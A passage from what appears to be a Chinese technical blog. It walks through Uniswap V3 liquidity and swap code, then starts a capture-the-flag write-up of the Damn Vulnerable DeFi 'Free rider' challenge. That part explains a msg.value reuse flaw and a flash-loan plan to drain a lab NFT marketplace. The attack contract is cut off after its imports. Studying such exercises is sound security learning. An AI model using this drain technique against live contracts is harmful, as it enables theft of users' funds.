class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">function update(</span><br><span class="line">    mapping(int24 &#x3D;&gt; Tick.Info) storage self,</span><br><span class="line">    int24 tick,</span><br><span class="line">    int24 tickCurrent,</span><br><span class="line">    int128 liquidityDelta,</span><br><span class="line">    uint256 feeGrowthGlobal0X128,</span><br><span class="line">    uint256 feeGrowthGlobal1X128,</span><br><span class="line">    uint160 secondsPerLiquidityCumulativeX128,</span><br><span class="line">    int56 tickCumulative,</span><br><span class="line">    uint32 time,</span><br><span class="line">    bool upper,</span><br><span class="line">    uint128 maxLiquidity</span><br><span class="line">) internal returns (bool flipped) &#123;</span><br><span class="line">    Tick.Info storage info &#x3D; self[tick];</span><br><span class="line"> </span><br><span class="line">    uint128 liquidityGrossBefore &#x3D; info.liquidityGross;</span><br><span class="line">    uint128 liquidityGrossAfter &#x3D; LiquidityMath.addDelta(liquidityGrossBefore, liquidityDelta);</span><br><span class="line"> </span><br><span class="line">    require(liquidityGrossAfter &lt;&#x3D; maxLiquidity, &#39;LO&#39;);</span><br><span class="line"> </span><br><span class="line">    flipped &#x3D; (liquidityGrossAfter &#x3D;&#x3D; 0) !&#x3D; (liquidityGrossBefore &#x3D;&#x3D; 0);</span><br><span class="line"> </span><br><span class="line">    if (liquidityGrossBefore &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        &#x2F;&#x2F; by convention, we assume that all growth before a tick was initialized happened _below_ the tick</span><br><span class="line">        if (tick &lt;&#x3D; tickCurrent) &#123;</span><br><span class="line">            info.feeGrowthOutside0X128 &#x3D; feeGrowthGlobal0X128;</span><br><span class="line">            info.feeGrowthOutside1X128 &#x3D; feeGrowthGlobal1X128;</span><br><span class="line">            info.secondsPerLiquidityOutsideX128 &#x3D; secondsPerLiquidityCumulativeX128;</span><br><span class="line">            info.tickCumulativeOutside &#x3D; tickCumulative;</span><br><span class="line">            info.secondsOutside &#x3D; time;</span><br><span class="line">        &#125;</span><br><span class="line">        info.initialized &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    info.liquidityGross &#x3D; liquidityGrossAfter;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; when the lower (upper) tick is crossed left to right (right to left), liquidity must be added (removed)</span><br><span class="line">    info.liquidityNet &#x3D; upper</span><br><span class="line">        ? int256(info.liquidityNet).sub(liquidityDelta).toInt128()</span><br><span class="line">        : int256(info.liquidityNet).add(liquidityDelta).toInt128();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>clear</code>函数用于清除trick数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function clear(mapping(int24 &#x3D;&gt; Tick.Info) storage self, int24 tick) internal &#123;</span><br><span class="line">    delete self[tick];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>cross</code>函数用于根据价格变动的需要转换到下一个trick<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function cross(</span><br><span class="line">    mapping(int24 &#x3D;&gt; Tick.Info) storage self,</span><br><span class="line">    int24 tick,</span><br><span class="line">    uint256 feeGrowthGlobal0X128,</span><br><span class="line">    uint256 feeGrowthGlobal1X128,</span><br><span class="line">    uint160 secondsPerLiquidityCumulativeX128,</span><br><span class="line">    int56 tickCumulative,</span><br><span class="line">    uint32 time</span><br><span class="line">) internal returns (int128 liquidityNet) &#123;</span><br><span class="line">    Tick.Info storage info &#x3D; self[tick];</span><br><span class="line">    info.feeGrowthOutside0X128 &#x3D; feeGrowthGlobal0X128 - info.feeGrowthOutside0X128;</span><br><span class="line">    info.feeGrowthOutside1X128 &#x3D; feeGrowthGlobal1X128 - info.feeGrowthOutside1X128;</span><br><span class="line">    info.secondsPerLiquidityOutsideX128 &#x3D; secondsPerLiquidityCumulativeX128 - info.secondsPerLiquidityOutsideX128;</span><br><span class="line">    info.tickCumulativeOutside &#x3D; tickCumulative - info.tickCumulativeOutside;</span><br><span class="line">    info.secondsOutside &#x3D; time - info.secondsOutside;</span><br><span class="line">    liquidityNet &#x3D; info.liquidityNet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="tick-位图"><a href="#tick-位图" class="headerlink" title="tick 位图"></a>tick 位图</h4><p>tick 位图用于记录所有被引用的 lower/upper tick index，我们可以用过 tick 位图，从当前价格找到下一个（从左至右或者从右至左）被引用的 tick index。关于 tick 位图的管理，在 _updatePosition 中的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (flippedLower) &#123;</span><br><span class="line">    tickBitmap.flipTick(tickLower, tickSpacing);</span><br><span class="line">    secondsOutside.initialize(tickLower, tick, tickSpacing, blockTimestamp);</span><br><span class="line">&#125;</span><br><span class="line">if (flippedUpper) &#123;</span><br><span class="line">    tickBitmap.flipTick(tickUpper, tickSpacing);</span><br><span class="line">    secondsOutside.initialize(tickUpper, tick, tickSpacing, blockTimestamp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里不做进一步的说明，具体代码实现在<code>TickBitmap</code>库中。tick 位图有以下几个特性：</p><ul><li>对于不存在的 tick，不需要初始值，因为访问 map 中不存在的 key 默认值就是 0</li><li>通过对位图的每个 word(uint256) 建立索引来管理位图，即访问路径为 word index -&gt; word -&gt; tick bit</li></ul><h4 id="完成流动性添加"><a href="#完成流动性添加" class="headerlink" title="完成流动性添加"></a>完成流动性添加</h4><p><code>_modifyPosition</code>调用完成后，会返回 x token, 和 y token 的数量。再来看 UniswapV3Pool.mint 的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">function mint(</span><br><span class="line">    address recipient,</span><br><span class="line">    int24 tickLower,</span><br><span class="line">    int24 tickUpper,</span><br><span class="line">    uint128 amount,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) external override lock returns (uint256 amount0, uint256 amount1) &#123;</span><br><span class="line">    require(amount &gt; 0);</span><br><span class="line">    (, int256 amount0Int, int256 amount1Int) &#x3D;</span><br><span class="line">        _modifyPosition(</span><br><span class="line">            ModifyPositionParams(&#123;</span><br><span class="line">                owner: recipient,</span><br><span class="line">                tickLower: tickLower,</span><br><span class="line">                tickUpper: tickUpper,</span><br><span class="line">                liquidityDelta: int256(amount).toInt128()</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    amount0 &#x3D; uint256(amount0Int);</span><br><span class="line">    amount1 &#x3D; uint256(amount1Int);</span><br><span class="line"></span><br><span class="line">    uint256 balance0Before;</span><br><span class="line">    uint256 balance1Before;</span><br><span class="line">    &#x2F;&#x2F; 获取当前池中的 x token, y token 余额</span><br><span class="line">    if (amount0 &gt; 0) balance0Before &#x3D; balance0();</span><br><span class="line">    if (amount1 &gt; 0) balance1Before &#x3D; balance1();</span><br><span class="line">    &#x2F;&#x2F; 将需要的 x token 和 y token 数量传给回调函数，这里预期回调函数会将指定数量的 token 发送到合约中</span><br><span class="line">    IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);</span><br><span class="line">    &#x2F;&#x2F; 回调完成后，检查发送至合约的 token 是否复合预期，如果不满足检查则回滚交易</span><br><span class="line">    if (amount0 &gt; 0) require(balance0Before.add(amount0) &lt;&#x3D; balance0(), &#39;M0&#39;);</span><br><span class="line">    if (amount1 &gt; 0) require(balance1Before.add(amount1) &lt;&#x3D; balance1(), &#39;M1&#39;);</span><br><span class="line"></span><br><span class="line">    emit Mint(msg.sender, recipient, tickLower, tickUpper, amount, amount0, amount1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个函数关键的步骤就是通过回调函数，让调用方发送指定数量的 x token 和 y token 至合约中。</p><p>再来看<code>NonfungiblePositionManager.mint</code>的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">function mint(MintParams calldata params)</span><br><span class="line">    external</span><br><span class="line">    payable</span><br><span class="line">    override</span><br><span class="line">    checkDeadline(params.deadline)</span><br><span class="line">    returns (</span><br><span class="line">        uint256 tokenId,</span><br><span class="line">        uint256 amount0,</span><br><span class="line">        uint256 amount1</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    IUniswapV3Pool pool;</span><br><span class="line">    &#x2F;&#x2F; 这里是添加流动性，并完成 x token 和 y token 的发送</span><br><span class="line">    (amount0, amount1, pool) &#x3D; addLiquidity(</span><br><span class="line">        AddLiquidityParams(&#123;</span><br><span class="line">            token0: params.token0,</span><br><span class="line">            token1: params.token1,</span><br><span class="line">            fee: params.fee,</span><br><span class="line">            recipient: address(this),</span><br><span class="line">            tickLower: params.tickLower,</span><br><span class="line">            tickUpper: params.tickUpper,</span><br><span class="line">            amount: params.amount,</span><br><span class="line">            amount0Max: params.amount0Max,</span><br><span class="line">            amount1Max: params.amount1Max</span><br><span class="line">        &#125;)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 铸造 ERC721 token 给用户，用来代表用户所持有的流动性</span><br><span class="line">    _mint(params.recipient, (tokenId &#x3D; _nextId++));</span><br><span class="line"></span><br><span class="line">    bytes32 positionKey &#x3D; PositionKey.compute(address(this), params.tickLower, params.tickUpper);</span><br><span class="line">    (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) &#x3D; pool.positions(positionKey);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; idempotent set</span><br><span class="line">    uint80 poolId &#x3D;</span><br><span class="line">        cachePoolKey(</span><br><span class="line">            address(pool),</span><br><span class="line">            PoolAddress.PoolKey(&#123;token0: params.token0, token1: params.token1, fee: params.fee&#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 用 ERC721 的 token ID 作为键，将用户提供流动性的元信息保存起来</span><br><span class="line">    _positions[tokenId] &#x3D; Position(&#123;</span><br><span class="line">        nonce: 0,</span><br><span class="line">        operator: address(0),</span><br><span class="line">        poolId: poolId,</span><br><span class="line">        tickLower: params.tickLower,</span><br><span class="line">        tickUpper: params.tickUpper,</span><br><span class="line">        liquidity: params.amount,</span><br><span class="line">        feeGrowthInside0LastX128: feeGrowthInside0LastX128,</span><br><span class="line">        feeGrowthInside1LastX128: feeGrowthInside1LastX128,</span><br><span class="line">        tokensOwed0: 0,</span><br><span class="line">        tokensOwed1: 0</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到这个函数主要是将用户的 Position 保存起来，并给用户铸造 NFT token，代表其所持有的流动性。至此提供流动性的步骤就完成了。</p><h4 id="流动性的移除"><a href="#流动性的移除" class="headerlink" title="流动性的移除"></a>流动性的移除</h4><p>流动性的移除其实就是上述操作的逆操作，在<code>burn</code>函数中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function burn(</span><br><span class="line">    int24 tickLower,</span><br><span class="line">    int24 tickUpper,</span><br><span class="line">    uint128 amount</span><br><span class="line">) external override lock returns (uint256 amount0, uint256 amount1) &#123;</span><br><span class="line">    &#x2F;&#x2F; 先计算出需要移除的 token 数</span><br><span class="line">    (Position.Info storage position, int256 amount0Int, int256 amount1Int) &#x3D;</span><br><span class="line">        _modifyPosition(</span><br><span class="line">            ModifyPositionParams(&#123;</span><br><span class="line">                owner: msg.sender,</span><br><span class="line">                tickLower: tickLower,</span><br><span class="line">                tickUpper: tickUpper,</span><br><span class="line">                liquidityDelta: -int256(amount).toInt128()</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    amount0 &#x3D; uint256(-amount0Int);</span><br><span class="line">    amount1 &#x3D; uint256(-amount1Int);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 注意这里，移除流动性后，将移出的 token 数记录到了 position.tokensOwed 上</span><br><span class="line">    if (amount0 &gt; 0 || amount1 &gt; 0) &#123;</span><br><span class="line">        (position.tokensOwed0, position.tokensOwed1) &#x3D; (</span><br><span class="line">            position.tokensOwed0 + uint128(amount0),</span><br><span class="line">            position.tokensOwed1 + uint128(amount1)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit Burn(msg.sender, tickLower, tickUpper, amount, amount0, amount1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="交易过程"><a href="#交易过程" class="headerlink" title="交易过程"></a>交易过程</h3><p>v3 的<code>UniswapV3Pool</code>提供了比较底层的交易接口，而在<code>SwapRouter</code>合约中封装了面向用户的交易接口：</p><ul><li><strong>exactInput:</strong> 指定交易对路径，付出的 x token 数和预期得到的最小 y token 数（x, y 可以互换）</li><li><strong>exactOutput:</strong> 指定交易路径，付出的 x token 最大数和预期得到的 y token 数（x, y 可以互换）</li></ul><h4 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h4><p>关于上文提到的交易路径，在进行两个代币交易时，是首先需要在链下计算出交易的路径，例如使用<code>ETH -&gt; DAI</code>：</p><ul><li>可以直接通过<code>ETH/DAI</code>的交易池完成</li><li>也可以通过<code>ETH -&gt; USDC -&gt; DAI</code>路径，即经过<code>ETH/USDC</code>, <code>USDC/DAI</code>两个交易池完成交易</li></ul><p>Uniswap 的前端会帮用户实时计算出最优路径（即交易的收益最高），作为参数传给合约调用。前端中这部分计算的具体实现在这里，具体过程为先用需要交易的输入代币，输出代币，以及一系列可用的中间代币（代码中叫 Base token）生成所有的路径（当然为了降低复杂度，路径中最多包含3个代币），然后遍历每个路径输出的输出代币数量，最后选取最佳路径.<br>事实上因为 v3 引入了费率的原因，在路径选择的过程中还需要考虑费率的因素。</p><h3 id="交易入口"><a href="#交易入口" class="headerlink" title="交易入口"></a>交易入口</h3><p>交易入口是<code>exactInput</code>函数，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">struct ExactInputParams &#123;</span><br><span class="line">    bytes path;                 &#x2F;&#x2F; 路径</span><br><span class="line">    address recipient;          &#x2F;&#x2F; 收款地址</span><br><span class="line">    uint256 deadline;           &#x2F;&#x2F; 交易有效期</span><br><span class="line">    uint256 amountIn;           &#x2F;&#x2F; 输入的 token 数（输入的 token 地址就是 path 中的第一个地址）</span><br><span class="line">    uint256 amountOutMinimum;   &#x2F;&#x2F; 预期交易最少获得的 token 数（获得的 token 地址就是 path 中最后一个地址）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function exactInput(ExactInputParams memory params)</span><br><span class="line">    external</span><br><span class="line">    payable</span><br><span class="line">    override</span><br><span class="line">    checkDeadline(params.deadline)</span><br><span class="line">    returns (uint256 amountOut)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 通过循环，遍历传入的路径，进行交易</span><br><span class="line">    while (true) &#123;</span><br><span class="line">        bool hasPools &#x3D; params.path.hasPools();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 完成当前路径的交易</span><br><span class="line">        params.amountIn &#x3D; exactInputSingle(</span><br><span class="line">            params.amountIn,</span><br><span class="line">            &#x2F;&#x2F; 如果是中间交易，又合约代为收取和支付中间代币</span><br><span class="line">            hasPools ? address(this) : params.recipient,</span><br><span class="line">            &#x2F;&#x2F; 给回调函数用的参数</span><br><span class="line">            SwapData(&#123;</span><br><span class="line">                path: params.path.getFirstPool(),</span><br><span class="line">                payer: msg.sender</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果路径全部遍历完成，则退出循环，交易完成</span><br><span class="line">        if (hasPools) &#123;</span><br><span class="line">            &#x2F;&#x2F; 步进 path 中的值</span><br><span class="line">            params.path &#x3D; params.path.skipToken();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            amountOut &#x3D; params.amountIn;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 检查交易是否满足预期</span><br><span class="line">    require(amountOut &gt;&#x3D; params.amountOutMinimum, &#39;Too little received&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="路径的编码"><a href="#路径的编码" class="headerlink" title="路径的编码"></a>路径的编码</h4><p>细心看的话其实可以知道上面输入的参数中 <code>path</code> 字段是 <code>bytes</code> 类型，通过这样可以实现更加紧凑的编码。Uniswap会将<code>bytes</code>作为一个数组使用，bytes类型就是一连串的<code>byte1</code>,因此相比普通数组其结构更加紧凑。在 Uniswap V3 中 <code>path</code>内部编码结构如下图：</p><p>![]path_encode.jpg)</p><p>图中展示了一个包含 2个路径（pool0, 和 pool1）的 path 编码。Uniswap 将编码解码操作封装在了 <code>Path</code> 库中，本文不再赘述其过程。每次交易时，会取出头部的 <code>tokenIn</code>, <code>tokenOut</code>, <code>fee</code>，使用这三个参数找到对应的交易池，完成交易。</p><h4 id="单个池的交易过程"><a href="#单个池的交易过程" class="headerlink" title="单个池的交易过程"></a>单个池的交易过程</h4><p>单个池的交易在 <code>exactInputSingle</code> 函数中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function exactInputSingle(</span><br><span class="line">    uint256 amountIn,</span><br><span class="line">    address recipient,</span><br><span class="line">    SwapData memory data</span><br><span class="line">) private returns (uint256 amountOut) &#123;</span><br><span class="line">    &#x2F;&#x2F; 将 path 解码，获取头部的 tokenIn, tokenOut, fee</span><br><span class="line">    (address tokenIn, address tokenOut, uint24 fee) &#x3D; data.path.decodeFirstPool();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 因为交易池只保存了 token x 的价格，这里我们需要知道输入的 token 是交易池 x token 还是 y token</span><br><span class="line">    bool zeroForOne &#x3D; tokenIn &lt; tokenOut;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 完成交易</span><br><span class="line">    (int256 amount0, int256 amount1) &#x3D;</span><br><span class="line">        getPool(tokenIn, tokenOut, fee).swap(</span><br><span class="line">            recipient,</span><br><span class="line">            zeroForOne,</span><br><span class="line">            amountIn.toInt256(),</span><br><span class="line">            zeroForOne ? MIN_SQRT_RATIO : MAX_SQRT_RATIO,</span><br><span class="line">            &#x2F;&#x2F; 给回调函数用的参数</span><br><span class="line">            abi.encode(data)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    return uint256(-(zeroForOne ? amount1 : amount0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交易过程是先获取交易池，然后确定本次交易的输出是交易池的<code>token x</code>还是<code>token y</code></p><p>这是因为交易池中只保存了x的价格，所以<code>token x</code>和<code>token y</code>的计算公式是不一样的。最用再调用<code>UniswapV3Pool</code>的<code>swap</code>完成交易。</p><h4 id="交易分解"><a href="#交易分解" class="headerlink" title="交易分解"></a>交易分解</h4><p><code>UniswapV3Pool.swap</code> 函数比较长，这里简要描述其交易步骤：</p><p>假设支付的token为x，价格为：</p><script type="math/tex; mode=display">\sqrt(P) = \sqrt(\frac{y}{x} )</script><p><img src="swap.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Uniswap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Uniswap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解 10-11</title>
      <link href="/DamnDefi-10-11/"/>
      <url>/DamnDefi-10-11/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi靶场刷题记录-10-11"><a href="#Damn-Defi靶场刷题记录-10-11" class="headerlink" title="Damn Defi靶场刷题记录(10-11)"></a>Damn Defi靶场刷题记录(10-11)</h1><pre><code>author: Thomas_Xu</code></pre><h2 id="10-Free-rider"><a href="#10-Free-rider" class="headerlink" title="10 Free rider"></a>10 Free rider</h2><p>这又是一道利用闪电贷来获取利益的题目。可见Defi平台要预防可能的闪电攻击是个难题。</p><p>题目要求我们偷走买家的的45个ETH，并且还要市场失去一些比特币。</p><h3 id="Code-Review"><a href="#Code-Review" class="headerlink" title="Code Review"></a><strong>Code Review</strong></h3><p>首先我们从头来看这个Challenge</p><ul><li><p><strong>FreeRiderNFTMarketplace</strong><br>这是交易市场的合约,主要的功能就是商品的上架，买入等功能。</p><ul><li>offerMany(uint256[] calldata tokenIds, uint256[] calldata prices)<blockquote><p>这是一个根据NFTid定价的函数，传入的参数分别是NFT的id数组和价格数组。</p></blockquote></li><li>buyMany(uint256[] calldata tokenIds) external payable<blockquote><p>这是购买指定id的NFT的函数。入参即NFT的id数组。<br>在阅读市场合约后，我产生一个疑惑”题目中要求市场合约损失一些ETH是怎么回事”，于是我立即又倒回去再次审查，看到<code>_buyOne</code>的时候立即让我警觉起来<br><img src="Damn10_1.png" alt=""><br>这里通过msg.value来检查发送的金额是否足够买下此NFT，看似没有问题，但是！<code>buyMany()</code>函数通过循环来调用了这个<code>_buyMany()</code>子函数，这样一组合，就导致这一流程出现重入的风险，我们只要一次调用<code>buyMany()</code>，那么在每次循环，我们的<code>msg.value</code>并不会发生变化。这意味着我们可以用一笔很少的钱买下市场上所有单价低于此金额的NFT。<br>这就是市场ETH减少的秘密！</p></blockquote></li></ul></li><li><p><strong>Exploit</strong><br>我们再来理一理思路，我们要做的是：</p><blockquote><p>1.先通过闪电贷借30ETH通过正规途径买入两个NFT<br>2.将买入的两个NFT以90ETH/个的价格出售<br>3.再通过闪电贷获得90ETH后，自己当买家，通过重入漏洞以90一个的价格买入两个NFT(消耗市场的余额)<br>4.还给闪电贷120个ETH后，自己赚取60个ETH正好可以买4余下的4个NFT</p></blockquote></li></ul><p>以此写出攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;.&#x2F;FreeRiderBuyer.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;FreeRiderNFTMarketplace.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC721&#x2F;IERC721Receiver.sol&quot;;</span><br><span class="line">import &quot;..&#x2F;DamnValuableNFT.sol&quot;;</span><br><span class="line">import &quot;hardhat&#x2F;console.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IUniswapV2Callee &#123;</span><br><span class="line">    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IWETH &#123;</span><br><span class="line">    function transfer(address recipient, uint256 amount) external returns (bool);</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function 